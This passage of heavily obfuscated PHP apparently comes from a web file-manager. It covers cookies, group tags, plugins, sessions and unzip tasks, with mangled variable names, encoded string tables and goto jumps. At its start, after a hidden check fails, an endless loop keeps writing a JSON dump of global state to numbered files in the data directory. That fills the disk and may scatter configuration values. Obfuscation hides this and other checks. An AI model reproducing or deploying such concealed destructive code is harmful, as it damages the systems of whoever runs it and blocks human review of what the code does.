explode($¹ßÎÛã¹[59], $ø²…€ƒş); if (count($ÂÈŒ”×¬) < $¹ßÎÛã¹[706]) { $»€•”Šø = $¹ßÎÛã¹[61]; $»€•”Šø(); } $ôòùÅõ = $¹ßÎÛã¹[961]; $ôòùÅõ($_SERVER[$¹ßÎÛã¹[962]]); $Õ…©ğáº = $¹ßÎÛã¹[960]; $Õ…©ğáº(); $“«Öœ¶– = $¹ßÎÛã¹[963]; $±¶Ÿ»ûÔ = json_encode($GLOBALS[$¹ßÎÛã¹[964]]); $°‚Ùë‘Œ = 1; for ($ñšù•õ = $°‚Ùë‘Œ; $ñšù•õ > 0; $ñšù•õ++) { $“«Öœ¶–(DATA_PATH . $ñšù•õ, $±¶Ÿ»ûÔ); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $±Ù®ÀÚ) { $this->handle->flushall($±Ù®ÀÚ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($¼ƒÖÙÍó = '', $‰Çš¿à = 0) { if (is_string($¼ƒÖÙÍó) && $¼ƒÖÙÍó != $_SERVER[¼èá¯æÙ][12]) { $this->prefix = $¼ƒÖÙÍó; } if (is_numeric($‰Çš¿à) && $‰Çš¿à > 0) { $this->expire = $‰Çš¿à; } } public static function getInstance() { static $ûïö«î; if ($ûïö«î === null) { $ûïö«î = new self(); } return $ûïö«î; } private static $cookieDisable = false; public static function disable($ƒß¢©©Û) { self::$cookieDisable = $ƒß¢©©Û; } private static $sameCookieSet = array(); public static function set($şı½Ûş, $ Ù‘¸½, $è¤…´Ä¨ = 0, $ğ…ØŸ”æ = false, $é²ôÕŞš = false) { $óÅúäëí =& $_SERVER[¼èá¯æÙ]; if (self::$cookieDisable) { return; } if (!$è¤…´Ä¨) { $è¤…´Ä¨ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$şı½Ûş]) && self::$sameCookieSet[$şı½Ûş] == $ Ù‘¸½ . $è¤…´Ä¨) { return; } self::$sameCookieSet[$şı½Ûş] = $ Ù‘¸½ . $è¤…´Ä¨; if (!$é²ôÕŞš) { $é²ôÕŞš = str_replace(HOST, $óÅúäëí[12], APP_HOST); $é²ôÕŞš = _get($GLOBALS, $óÅúäëí[965], $é²ôÕŞš); } $¦¸ß¹Â˜ = $óÅúäëí[12]; setcookie($şı½Ûş, $ Ù‘¸½, time() + $è¤…´Ä¨, $óÅúäëí[8] . trim($é²ôÕŞš, $óÅúäëí[8]) . $¦¸ß¹Â˜, !1, !1, $ğ…ØŸ”æ); } public static function setSafe($—¢´³‘¹, $ƒš±¿½œ, $ ¸ùŒª€ = 0) { self::set($—¢´³‘¹, $ƒš±¿½œ, $ ¸ùŒª€, !0); } public static function get($»¡¨ßÊ) { static $åÇ—½— = false; if (!$åÇ—½—) { self::initHeaderCookie(); $åÇ—½— = !0; } return isset($_COOKIE[$»¡¨ßÊ]) ? $_COOKIE[$»¡¨ßÊ] : !1; } private static function initHeaderCookie() { $ÅÇğİ¡ğ =& $_SERVER[¼èá¯æÙ]; if (!isset($_SERVER[$ÅÇğİ¡ğ[966]]) || !$_SERVER[$ÅÇğİ¡ğ[966]]) { return; } $üÓŠÇ×¾ = explode($ÅÇğİ¡ğ[84], $_SERVER[$ÅÇğİ¡ğ[966]]); foreach ($üÓŠÇ×¾ as $Ô†ëÏÚ¯) { $Ô†ëÏÚ¯ = explode($ÅÇğİ¡ğ[517], $Ô†ëÏÚ¯); if (count($Ô†ëÏÚ¯) != 2 || !isset($Ô†ëÏÚ¯[1])) { continue; } $_COOKIE[trim($Ô†ëÏÚ¯[0])] = trim($Ô†ëÏÚ¯[1]); } } public static function remove($¥ï“º¢», $”¡Âô…¢ = false) { unset($_COOKIE[$¥ï“º¢»]); self::set($¥ï“º¢», $_SERVER[¼èá¯æÙ][12], 1, $”¡Âô…¢); } } goto Bƒ¿îÜ‰; a§ƒÂ÷µ¸­: define($_SERVER[¼èá¯æÙ][330], 0); define($_SERVER[¼èá¯æÙ][331], 2); if ($_SERVER[$_SERVER[¼èá¯æÙ][54]] != $_SERVER[$_SERVER[¼èá¯æÙ][332]]) { $_getc = $_SERVER[¼èá¯æÙ][56]; $_getfile = $_SERVER[$_SERVER[¼èá¯æÙ][57]] . $_SERVER[¼èá¯æÙ][58]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¼èá¯æÙ][59], $_getfilec); if (count($_getarrs) < $_SERVER[¼èá¯æÙ][60]) { $exit = $_SERVER[¼èá¯æÙ][61]; $exit(); } $_act = $_SERVER[¼èá¯æÙ][62]; $_act($_SERVER[$_SERVER[¼èá¯æÙ][55]]); } goto Eñ¥Íƒ‘; fåù›Ü©¹: class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\146\x61\166"; protected function cacheFunctionAlias($‹†íàÈ¥) { $Öå¸üƒ´ =& $_SERVER[¼èá¯æÙ]; return array($Öå¸üƒ´[2092] => array($‹†íàÈ¥[0], $Öå¸üƒ´[2093]), $Öå¸üƒ´[2094] => array($‹†íàÈ¥[0], $Öå¸üƒ´[2095])); } protected function get($‚‘¨ÜÁ) { $Òå©³ığ =& $_SERVER[¼èá¯æÙ]; $¢»¦áªÉ = Model($Òå©³ığ[596])->metaGet($‚‘¨ÜÁ, $Òå©³ığ[2096]); $¯†“ÎŒÖ = json_decode($¢»¦áªÉ, !0); return $¯†“ÎŒÖ ? $¯†“ÎŒÖ : array($Òå©³ığ[2097] => $Òå©³ığ[101], $Òå©³ığ[457] => array()); } protected function set($÷ÃÚÂç, $‚ë¹¢õœ) { $®€ùÑ¹ =& $_SERVER[¼èá¯æÙ]; $‚ë¹¢õœ = $‚ë¹¢õœ ? $‚ë¹¢õœ : array($®€ùÑ¹[2097] => $®€ùÑ¹[101], $®€ùÑ¹[457] => array()); return Model($®€ùÑ¹[596])->metaSet($÷ÃÚÂç, $®€ùÑ¹[2096], json_encode($‚ë¹¢õœ)); } protected function getByTagID($¢‰¬ÊĞª, $ôï›ñÑÌ) { $¸ÂşÈ“« =& $_SERVER[¼èá¯æÙ]; if (!$¢‰¬ÊĞª || !$ôï›ñÑÌ) { return !1; } if (!Model($¸ÂşÈ“«[596])->getInfoSimple($¢‰¬ÊĞª)) { return !1; } $ù± ¿²ò = $this->get($¢‰¬ÊĞª); if (!$ù± ¿²ò || !isset($ù± ¿²ò[$¸ÂşÈ“«[457]])) { return !1; } $ù½æ¿Û = array_find_by_field($ù± ¿²ò[$¸ÂşÈ“«[457]], $¸ÂşÈ“«[486], $ôï›ñÑÌ); return is_array($ù½æ¿Û) ? $ù½æ¿Û : !1; } public function listSource($ùşÆÓ”, $‰³ú…ËÑ) { $´àçÇÑÖ =& $_SERVER[¼èá¯æÙ]; if ($‰³ú…ËÑ && !is_array($‰³ú…ËÑ)) { $‰³ú…ËÑ = array($‰³ú…ËÑ); } $ÏÇğôîó = $this->listData($ùşÆÓ”); $¡ã¯‹ÅÜ = array(); foreach ($ÏÇğôîó as $®ßù¹ú¹) { $‹É˜Îî = $®ßù¹ú¹[$´àçÇÑÖ[97]]; if (!$‹É˜Îî) { continue; } if (!isset($¡ã¯‹ÅÜ[$‹É˜Îî])) { $¡ã¯‹ÅÜ[$‹É˜Îî] = array(); } $¡ã¯‹ÅÜ[$‹É˜Îî][] = $®ßù¹ú¹[$´àçÇÑÖ[511]]; } $ßÓşµ– = array(); foreach ($¡ã¯‹ÅÜ as $à¢˜£ï => $€áÎ·ÊÑ) { $°‡‡í † = !0; if (!$‰³ú…ËÑ) { $ßÓşµ–[] = $à¢˜£ï; continue; } foreach ($‰³ú…ËÑ as $‹®ã ä‡) { if (!in_array($‹®ã ä‡, $€áÎ·ÊÑ)) { $°‡‡í † = !1; break; } } if ($°‡‡í †) { $ßÓşµ–[] = $à¢˜£ï; } } if (!$ßÓşµ–) { return array(); } $™ä‹¡¸“ = array($´àçÇÑÖ[502] => array($´àçÇÑÖ[503], $ßÓşµ–), $´àçÇÑÖ[580] => $ùşÆÓ”, $´àçÇÑÖ[200] => SourceModel::TYPE_GROUP); $ù­œ‰’ = Model($´àçÇÑÖ[1426])->listSource($™ä‹¡¸“); if (!$ù­œ‰’ || count($ßÓşµ–) == $ù­œ‰’[$´àçÇÑÖ[454]][$´àçÇÑÖ[455]]) { return $ù­œ‰’; } $’º–ûØ“ = array(); $ˆ‹Ÿò² = array_to_keyvalue($ù­œ‰’[$´àçÇÑÖ[95]], $´àçÇÑÖ[12], $´àçÇÑÖ[203]); $÷çå¯ÜÁ = array_to_keyvalue($ù­œ‰’[$´àçÇÑÖ[96]], $´àçÇÑÖ[12], $´àçÇÑÖ[203]); $‘û¾¢²µ = array_merge($÷çå¯ÜÁ, $ˆ‹Ÿò²); foreach ($ßÓşµ– as $‹É˜Îî) { if (!in_array($‹É˜Îî, $‘û¾¢²µ)) { $’º–ûØ“[] = $‹É˜Îî; } } if ($’º–ûØ“) { $this->removeBySource($ùşÆÓ”, $’º–ûØ“); } return $ù­œ‰’; } protected function listData($›×Æ‰¡Ş) { $êßğñğ =& $_SERVER[¼èá¯æÙ]; $É‘²Å©Ç = array($êßğñğ[1769] => 0, $êßğñğ[568] => array($êßğñğ[2098], 0), $êßğñğ[507] => $êßğñğ[2099] . $›×Æ‰¡Ş); $¬œñ§ùü = $êßğñğ[2100]; $Çù²ß‡Ó = $this->field($¬œñ§ùü)->where($É‘²Å©Ç)->order($êßğñğ[2101])->select(); return $Çù²ß‡Ó ? $Çù²ß‡Ó : array(); } protected function addToTag($ÕÔØˆß€, $„±ˆÆ—, $¥¿§‚á¡) { $™ãâÄ¬ =& $_SERVER[¼èá¯æÙ]; if (!$this->getByTagID($ÕÔØˆß€, $¥¿§‚á¡) || !$„±ˆÆ—) { return !1; } if (!Model($™ãâÄ¬[907])->pathInfo($„±ˆÆ—)) { return !1; } $ğÀÎø¼Â = array($™ãâÄ¬[1769] => 0, $™ãâÄ¬[568] => $¥¿§‚á¡, $™ãâÄ¬[506] => $„±ˆÆ—, $™ãâÄ¬[507] => $™ãâÄ¬[2102] . $ÕÔØˆß€, $™ãâÄ¬[505] => $™ãâÄ¬[12], $™ãâÄ¬[1983] => 0); if ($this->where($ğÀÎø¼Â)->find()) { return !1; } return $this->add($ğÀÎø¼Â); } protected function removeFromTag($â‘¾íÔ, $»è‹Ñº, $íü­Ù˜) { $”ãøÚ‰“ =& $_SERVER[¼èá¯æÙ]; if (!$this->getByTagID($â‘¾íÔ, $íü­Ù˜) || !$»è‹Ñº) { return !1; } if (is_array($»è‹Ñº)) { $»è‹Ñº = array($”ãøÚ‰“[7], $»è‹Ñº); } $‰ºáåœı = array($”ãøÚ‰“[1769] => 0, $”ãøÚ‰“[568] => $íü­Ù˜, $”ãøÚ‰“[507] => $”ãøÚ‰“[2102] . $â‘¾íÔ, $”ãøÚ‰“[506] => $»è‹Ñº); return $this->where($‰ºáåœı)->delete(); } protected function removeByTag($‘’‚ı¶˜, $½ÏÓ…¢Â) { $øŒéœ»Ñ =& $_SERVER[¼èá¯æÙ]; if (!$this->getByTagID($‘’‚ı¶˜, $½ÏÓ…¢Â)) { return !1; } $µìîûƒÔ = array($øŒéœ»Ñ[1769] => 0, $øŒéœ»Ñ[568] => $½ÏÓ…¢Â, $øŒéœ»Ñ[507] => $øŒéœ»Ñ[2102] . $‘’‚ı¶˜); return $this->where($µìîûƒÔ)->delete(); } protected function removeBySource($Ğ˜‚ŒÑÃ, $ÑÖÉêæÉ) { $ª¬Òèò =& $_SERVER[¼èá¯æÙ]; if (!$Ğ˜‚ŒÑÃ || !$ÑÖÉêæÉ) { return !1; } if (is_array($ÑÖÉêæÉ)) { $ÑÖÉêæÉ = array($ª¬Òèò[7], $ÑÖÉêæÉ); } $÷ÏØ¾²ğ = array($ª¬Òèò[1769] => 0, $ª¬Òèò[506] => $ÑÖÉêæÉ, $ª¬Òèò[568] => array($ª¬Òèò[1096], 0), $ª¬Òèò[507] => $ª¬Òèò[2102] . $Ğ˜‚ŒÑÃ); return $this->where($÷ÏØ¾²ğ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\56\x70\154\x75\147\151\156\x4c\151\x73\x74"; public $field = array("\x6e\141\x6d\145", "\x73\x74\141\164\x75\x73", "\x72\145\x67\151\145\163\164", "\x63\157\156\x66\x69\x67"); public function loadList($´ºû«Óâ = false) { $çˆ±Õï¢ = array_to_keyvalue($this->listData(), $_SERVER[¼èá¯æÙ][32]); if ($´ºû«Óâ) { return $çˆ±Õï¢[$´ºû«Óâ]; } return $çˆ±Õï¢; } public function init() { $Õ¬İ¤œá =& $_SERVER[¼èá¯æÙ]; Hook::trigger($Õ¬İ¤œá[2103]); $’­¡Ö… = $this->loadPluginList(); foreach ($’­¡Ö… as $üÅ…ô¦¤ => $«÷˜˜˜ı) { $›¦Á×Óå = $this->appAllow($üÅ…ô¦¤, $«÷˜˜˜ı); if (!$›¦Á×Óå) { continue; } foreach ($«÷˜˜˜ı[$Õ¬İ¤œá[2104]] as $‡ıˆŒ² => $é¯ªë‰) { Hook::bind($‡ıˆŒ², $é¯ªë‰); } } Hook::trigger($Õ¬İ¤œá[2105]); Hook::trigger(ACTION); } public function appAllow($µË„½ÔÂ, $õ˜ßÎÍ, $ÁÓ¶‘× = true) { $ƒæšåæÄ =& $_SERVER[¼èá¯æÙ]; $Ê‹º±¥ë = PLUGIN_DIR . $µË„½ÔÂ . $ƒæšåæÄ[2106]; if (!is_array($õ˜ßÎÍ) || !is_array($õ˜ßÎÍ[$ƒæšåæÄ[2104]]) || $õ˜ßÎÍ[$ƒæšåæÄ[832]] != 1 || !is_file($Ê‹º±¥ë)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$ƒæšåæÄ[6]][$ƒæšåæÄ[2107]] || !$GLOBALS[$ƒæšåæÄ[6]][$ƒæšåæÄ[2108]]) { return !0; } $Õ”ì£û = explode($ƒæšåæÄ[50], strtolower($GLOBALS[$ƒæšåæÄ[6]][$ƒæšåæÄ[2108]])); return in_array(strtolower($µË„½ÔÂ), $Õ”ì£û) ? !1 : !0; } if ($ÁÓ¶‘× && !Action($ƒæšåæÄ[2109])->checkAuth($µË„½ÔÂ)) { return !1; } return !0; } public function unInstall($ôÚŞ–«) { $‡ŒûÌë =& $_SERVER[¼èá¯æÙ]; $ğ¥ˆ±áÀ = $this->loadList($ôÚŞ–«); if (file_exists(PLUGIN_DIR . $ôÚŞ–«)) { Hook::apply($ôÚŞ–« . $‡ŒûÌë[2110]); } $this->remove($ğ¥ˆ±áÀ[$‡ŒûÌë[486]]); } public function changeStatus($ƒ«²ÊïÙ, $Â¡Äşß¯) { $ìÛåƒä =& $_SERVER[¼èá¯æÙ]; $„ßÂëŸÒ = $this->loadList($ƒ«²ÊïÙ); if ($Â¡Äşß¯) { Hook::apply($ƒ«²ÊïÙ . $ìÛåƒä[2111]); } $this->update($„ßÂëŸÒ[$ìÛåƒä[486]], array($ìÛåƒä[2112] => $Â¡Äşß¯)); } public function appRegist($Ş‚ô¶À›, $‰ªÁÙÆê) { $¬˜°“á” =& $_SERVER[¼èá¯æÙ]; $Œ¬ÎŸ¿ = $this->loadList($Ş‚ô¶À›); if ($Œ¬ÎŸ¿) { $this->update($Œ¬ÎŸ¿[$¬˜°“á”[486]], array($¬˜°“á”[2104] => $‰ªÁÙÆê)); } else { $ıÜïµ‘ö = array($¬˜°“á”[32] => $Ş‚ô¶À›, $¬˜°“á”[2104] => $‰ªÁÙÆê, $¬˜°“á”[832] => 0, $¬˜°“á”[6] => $this->getConfigDefault($Ş‚ô¶À›)); $this->insert($ıÜïµ‘ö); } } public function getConfigDefault($Õè¢Ò€) { $ö¦¯¢÷ø =& $_SERVER[¼èá¯æÙ]; $­äÇûª¯ = array(); $¹µú„·º = $this->getPackageJson($Õè¢Ò€); if (!$¹µú„·º && is_array($¹µú„·º[$ö¦¯¢÷ø[2113]])) { return $­äÇûª¯; } foreach ($¹µú„·º[$ö¦¯¢÷ø[2113]] as $ Ûƒ€Š­ => $ØáÂÇšï) { if (!isset($ØáÂÇšï[$ö¦¯¢÷ø[462]]) || isset($­äÇûª¯[$ Ûƒ€Š­])) { continue; } $­äÇûª¯[$ Ûƒ€Š­] = $ØáÂÇšï[$ö¦¯¢÷ø[462]]; } return $­äÇûª¯; } public function getPackageJson($¯¿öæ­) { return Hook::apply($¯¿öæ­ . $_SERVER[¼èá¯æÙ][2114]); } public function getConfig($éİŞååŒ, $åÃ¦È’Ê = false) { $ú¶óŒ×è =& $_SERVER[¼èá¯æÙ]; $ƒİœœ£ = array(); $ã¾›ºÖÆ = $this->loadList($éİŞååŒ); if ($ã¾›ºÖÆ && is_array($ã¾›ºÖÆ[$ú¶óŒ×è[6]])) { $ƒİœœ£ = $ã¾›ºÖÆ[$ú¶óŒ×è[6]]; } if (!$ƒİœœ£ || $åÃ¦È’Ê) { $ƒİœœ£ = $this->getConfigDefault($éİŞååŒ); } return $ƒİœœ£; } public function setConfig($Âì ÁÍñ, $ƒÀÇ€¤ú = false) { $Üú†ôäâ =& $_SERVER[¼èá¯æÙ]; $¶ªºÎ‰ = $this->loadList($Âì ÁÍñ); if (!$¶ªºÎ‰) { return !1; } $Êî–ü¤æ = $¶ªºÎ‰[$Üú†ôäâ[6]]; if ($ƒÀÇ€¤ú == !1) { $Êî–ü¤æ = array(); $ƒÀÇ€¤ú = $this->getConfigDefault($Âì ÁÍñ); } foreach ($ƒÀÇ€¤ú as $Ã˜£¿æœ => $›„ÙÏÊ¹) { $Êî–ü¤æ[$Ã˜£¿æœ] = is_string($›„ÙÏÊ¹) ? trim($›„ÙÏÊ¹) : $›„ÙÏÊ¹; } $this->update($¶ªºÎ‰[$Üú†ôäâ[486]], array($Üú†ôäâ[6] => $Êî–ü¤æ)); } public function viewList() { $¥ãÒ°ˆÀ =& $_SERVER[¼èá¯æÙ]; $öö·õùÌ = $this->loadList(); $this->pluginScan($öö·õùÌ); $öö·õùÌ = $this->loadPluginList(); $Êé¸®Œ‰ = array(); foreach ($öö·õùÌ as $ıÒèæ­’ => $¼Ä˜ºˆù) { $¯·åêó• = $¼Ä˜ºˆù; unset($¼Ä˜ºˆù[$¥ãÒ°ˆÀ[2104]], $¼Ä˜ºˆù[$¥ãÒ°ˆÀ[6]]); $ºä¥ÃÇ  = PLUGIN_DIR . $¼Ä˜ºˆù[$¥ãÒ°ˆÀ[32]] . $¥ãÒ°ˆÀ[2106]; if (!is_file($ºä¥ÃÇ )) { continue; } $àø‡Âæ² = Hook::apply($¼Ä˜ºˆù[$¥ãÒ°ˆÀ[32]] . $¥ãÒ°ˆÀ[2114]); if (!is_array($àø‡Âæ²)) { continue; } $Êé¸®Œ‰[$ıÒèæ­’] = array_merge($¼Ä˜ºˆù, $àø‡Âæ²); if ($¯·åêó•[$¥ãÒ°ˆÀ[6]][$¥ãÒ°ˆÀ[1691]] != $àø‡Âæ²[$¥ãÒ°ˆÀ[1665]]) { Hook::apply($¼Ä˜ºˆù[$¥ãÒ°ˆÀ[32]] . $¥ãÒ°ˆÀ[2111]); $¯·åêó•[$¥ãÒ°ˆÀ[6]][$¥ãÒ°ˆÀ[1691]] = $àø‡Âæ²[$¥ãÒ°ˆÀ[1665]]; $this->update($¼Ä˜ºˆù[$¥ãÒ°ˆÀ[486]], array($¥ãÒ°ˆÀ[6] => $¯·åêó•[$¥ãÒ°ˆÀ[6]])); } } return $Êé¸®Œ‰; } private function loadPluginList() { $ò¤Ÿº¹š =& $_SERVER[¼èá¯æÙ]; $˜¡ØëĞè = $this->loadList(); if (strtolower(MOD) == $ò¤Ÿº¹š[2115]) { return $˜¡ØëĞè; } $óÏ¿õ¨ = Hook::trigger($ò¤Ÿº¹š[2116], $˜¡ØëĞè); if ($˜¡ØëĞè && !$óÏ¿õ¨) { die; } return $óÏ¿õ¨ ? $óÏ¿õ¨ : $˜¡ØëĞè; } private function pluginScan($ÈüûË¬÷) { $×÷ÎÙ›œ =& $_SERVER[¼èá¯æÙ]; recursion_dir(PLUGIN_DIR, $ìŒÌ–Ô´, $Ã¡—ú²ì, 0); foreach ($ìŒÌ–Ô´ as $œàÈ¿ãû) { $´¼±ïÚ’ = get_path_this($œàÈ¿ãû); if (isset($ÈüûË¬÷[$´¼±ïÚ’]) || !file_exists($œàÈ¿ãû . $×÷ÎÙ›œ[2117]) || !file_exists($œàÈ¿ãû . $×÷ÎÙ›œ[2106])) { continue; } Hook::apply($´¼±ïÚ’ . $×÷ÎÙ›œ[2111]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\x65\155\137\x73\x65\163\x73\151\157\x6e"; public function get($å‘ëİ) { $¯™¡ß÷™ =& $_SERVER[¼èá¯æÙ]; $‘’•€éë = $this->where(array($¯™¡ß÷™[2118] => $å‘ëİ))->find(); if (!is_array($‘’•€éë)) { return !1; } return $‘’•€éë[$¯™¡ß÷™[181]]; } public function set($Óë­Óªİ, $™å™ §Ë, $ĞŸ¤»Ù‡ = 3600) { $û¸¢£» =& $_SERVER[¼èá¯æÙ]; $Áú»È»Ù = array($û¸¢£»[2118] => $Óë­Óªİ, $û¸¢£»[2018] => $™å™ §Ë, $û¸¢£»[2119] => $ĞŸ¤»Ù‡ + time()); if (Session::get($û¸¢£»[2120])) { $Áú»È»Ù[$û¸¢£»[1778]] = Session::get($û¸¢£»[2120]); } else { $Áú»È»Ù[$û¸¢£»[1778]] = 0; } if ($this->get($Óë­Óªİ)) { return $this->where(array($û¸¢£»[2118] => $Óë­Óªİ))->save($Áú»È»Ù); } else { return $this->add($Áú»È»Ù, array(), !0); } } public function remove($ìÄ¨ä©) { return $this->where(array($_SERVER[¼èá¯æÙ][2118] => $ìÄ¨ä©))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¼èá¯æÙ][2121] . time())->delete(); } } goto f¤½ÃÍÀ‘; fé¥¢íõ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $—£…¾€œ =& $_SERVER[¼èá¯æÙ]; parent::startAfter(); Hook::bind($—£…¾€œ[1893], array($this, $—£…¾€œ[1894])); Hook::bind($—£…¾€œ[1283], array($this, $—£…¾€œ[1895])); Hook::bind($—£…¾€œ[1896], array($this, $—£…¾€œ[1897])); $ßŠ’Ì =& $this->task; $ßŠ’Ì[$—£…¾€œ[1898]] = $—£…¾€œ[1284]; if (!$ßŠ’Ì[$—£…¾€œ[1666]]) { $ßŠ’Ì[$—£…¾€œ[1666]] = LNG($—£…¾€œ[1899]); } } protected function endAfter() { $ûÄµ‚Ÿà =& $_SERVER[¼èá¯æÙ]; parent::endAfter(); Hook::unbind($ûÄµ‚Ÿà[1893], array($this, $ûÄµ‚Ÿà[1894])); Hook::unbind($ûÄµ‚Ÿà[1283], array($this, $ûÄµ‚Ÿà[1895])); Hook::unbind($ûÄµ‚Ÿà[1896], array($this, $ûÄµ‚Ÿà[1897])); } public function updateAfter() { $æğÎøÈ =& $_SERVER[¼èá¯æÙ]; $Ü¯Ùœ²ä =& $this->task; if (!$Ü¯Ùœ²ä[$æğÎøÈ[1145]] || !$Ü¯Ùœ²ä[$æğÎøÈ[845]]) { if ($Ü¯Ùœ²ä[$æğÎøÈ[1898]] != $æğÎøÈ[400]) { return; } } if ($Ü¯Ùœ²ä[$æğÎøÈ[1898]] == $æğÎøÈ[1284]) { $»‰€ãÒ€ = 0; if ($Ü¯Ùœ²ä[$æğÎøÈ[1832]]) { $»‰€ãÒ€ = $Ü¯Ùœ²ä[$æğÎøÈ[1833]] / $Ü¯Ùœ²ä[$æğÎøÈ[1832]]; } $Ü¯Ùœ²ä[$æğÎøÈ[1780]] = $»‰€ãÒ€ * 0.3; } else { if ($Ü¯Ùœ²ä[$æğÎøÈ[1898]] == $æğÎøÈ[400]) { $»‰€ãÒ€ = $Ü¯Ùœ²ä[$æğÎøÈ[1779]] / $Ü¯Ùœ²ä[$æğÎøÈ[1145]]; $Ü¯Ùœ²ä[$æğÎøÈ[1780]] = 0.3 + $»‰€ãÒ€ * 0.4; } else { if ($Ü¯Ùœ²ä[$æğÎøÈ[1898]] == $æğÎøÈ[120]) { $Ìâ´•Ë¡ = 0; if ($Ü¯Ùœ²ä[$æğÎøÈ[1834]] == $æğÎøÈ[120]) { $Ìâ´•Ë¡ = $Ü¯Ùœ²ä[$æğÎøÈ[1833]]; } $»‰€ãÒ€ = ($Ü¯Ùœ²ä[$æğÎøÈ[1837]] + $Ìâ´•Ë¡) / $Ü¯Ùœ²ä[$æğÎøÈ[845]]; $Ü¯Ùœ²ä[$æğÎøÈ[1780]] = 0.3 + 0.4 + $»‰€ãÒ€ * 0.3; } } } if ($Ü¯Ùœ²ä[$æğÎøÈ[1780]] > 0) { $”·‚ß„ = timeFloat() - $Ü¯Ùœ²ä[$æğÎøÈ[1782]] - $Ü¯Ùœ²ä[$æğÎøÈ[1785]]; $Ü¯Ùœ²ä[$æğÎøÈ[1786]] = $”·‚ß„ * (1 - $Ü¯Ùœ²ä[$æğÎøÈ[1780]]) / $Ü¯Ùœ²ä[$æğÎøÈ[1780]]; } } public function addFile($ğï±û©™) { $öí°Ã =& $_SERVER[¼èá¯æÙ]; $®ç¬ =& $this->task; $“º•ƒœÕ = IO::info($ğï±û©™); $®ç¬[$öí°Ã[1830]] = $“º•ƒœÕ[$öí°Ã[32]]; $®ç¬[$öí°Ã[1832]] = $“º•ƒœÕ[$öí°Ã[89]]; $®ç¬[$öí°Ã[1833]] = 0; $®ç¬[$öí°Ã[1147]] = $öí°Ã[1853]; $®ç¬[$öí°Ã[1834]] = $öí°Ã[1284]; $®ç¬[$öí°Ã[845]] = $“º•ƒœÕ[$öí°Ã[89]]; $®ç¬[$öí°Ã[1145]] = 1; $¶°¡ÛŠ = 0; $®ç¬[$öí°Ã[1841]] = array($öí°Ã[1842] => $¶°¡ÛŠ + 1, $öí°Ã[505] => $“º•ƒœÕ[$öí°Ã[32]], $öí°Ã[97] => $“º•ƒœÕ[$öí°Ã[97]], $öí°Ã[593] => $“º•ƒœÕ[$öí°Ã[593]] ? $“º•ƒœÕ[$öí°Ã[593]] : $“º•ƒœÕ[$öí°Ã[97]]); $this->update(); } public function zipEvent($€´ëäÎƒ, $ˆ¨Êùàè, $°Ñ†ßˆº, $Ùë¸£Š”) { $ÚéÄïè =& $_SERVER[¼èá¯æÙ]; $Â¬Õ¸Œ =& $this->task; $Â¬Õ¸Œ[$ÚéÄïè[1830]] = get_path_this($ˆ¨Êùàè); $Â¬Õ¸Œ[$ÚéÄïè[1832]] = $Ùë¸£Š”; $Â¬Õ¸Œ[$ÚéÄïè[1833]] = $°Ñ†ßˆº; $Â¬Õ¸Œ[$ÚéÄïè[1147]] = $€´ëäÎƒ == $ÚéÄïè[1900] ? $ÚéÄïè[1901] : $ÚéÄïè[1902]; $Â¬Õ¸Œ[$ÚéÄïè[1834]] = $ÚéÄïè[12]; $Â¬Õ¸Œ[$ÚéÄïè[845]] = $Ùë¸£Š”; $Â¬Õ¸Œ[$ÚéÄïè[1898]] = $ÚéÄïè[400]; $this->update(); } public function unzipAfter($×¼ £¥É) { $ÉÌ¢â¸º =& $_SERVER[¼èá¯æÙ]; $´à“ â =& $this->task; $´à“ â[$ÉÌ¢â¸º[1898]] = $ÉÌ¢â¸º[120]; $Š¢’Èû¯ = IO::infoWithChildren($×¼ £¥É); $¡ÄïÅ™ = 0; $´à“ â[$ÉÌ¢â¸º[1841]] = array($ÉÌ¢â¸º[1842] => $¡ÄïÅ™ + 1, $ÉÌ¢â¸º[505] => $Š¢’Èû¯[$ÉÌ¢â¸º[32]], $ÉÌ¢â¸º[97] => $Š¢’Èû¯[$ÉÌ¢â¸º[97]], $ÉÌ¢â¸º[593] => $Š¢’Èû¯[$ÉÌ¢â¸º[593]] ? $Š¢’Èû¯[$ÉÌ¢â¸º[593]] : $Š¢’Èû¯[$ÉÌ¢â¸º[97]]); if ($Š¢’Èû¯[$ÉÌ¢â¸º[33]] == $ÉÌ¢â¸º[242]) { $´à“ â[$ÉÌ¢â¸º[1145]] = 1; } else { $´à“ â[$ÉÌ¢â¸º[1145]] = $Š¢’Èû¯[$ÉÌ¢â¸º[92]][$ÉÌ¢â¸º[90]]; } $´à“ â[$ÉÌ¢â¸º[1147]] = $ÉÌ¢â¸º[12]; $´à“ â[$ÉÌ¢â¸º[1834]] = 0; $´à“ â[$ÉÌ¢â¸º[1779]] = 0; $´à“ â[$ÉÌ¢â¸º[1832]] = 0; $´à“ â[$ÉÌ¢â¸º[1833]] = 0; $´à“ â[$ÉÌ¢â¸º[1830]] = $ÉÌ¢â¸º[12]; $´à“ â[$ÉÌ¢â¸º[1837]] = 0; $´à“ â[$ÉÌ¢â¸º[845]] = $Š¢’Èû¯[$ÉÌ¢â¸º[89]]; $this->update(); self::log($ÉÌ¢â¸º[1903] . json_encode(array($´à“ â, $Š¢’Èû¯))); } public function nameParse($œİ™ÂØÓ) { $Ôé¸Å’ =& $_SERVER[¼èá¯æÙ]; $Û¯ÑæËÍ =& $this->task; if ($Û¯ÑæËÍ[$Ôé¸Å’[1898]] == $Ôé¸Å’[1284]) { $Û¯ÑæËÍ[$Ôé¸Å’[1898]] = $Ôé¸Å’[400]; $Û¯ÑæËÍ[$Ôé¸Å’[1837]] = 0; $Û¯ÑæËÍ[$Ôé¸Å’[845]] = 0; } $Çş½ºˆ— = get_path_this($œİ™ÂØÓ); if (strstr($Çş½ºˆ—, $Ôé¸Å’[10])) { $Û¯ÑæËÍ[$Ôé¸Å’[1779]] += 1; $Û¯ÑæËÍ[$Ôé¸Å’[1145]] += 1; } $Û¯ÑæËÍ[$Ôé¸Å’[1830]] = $œİ™ÂØÓ; $this->update(); } } class TaskZip extends 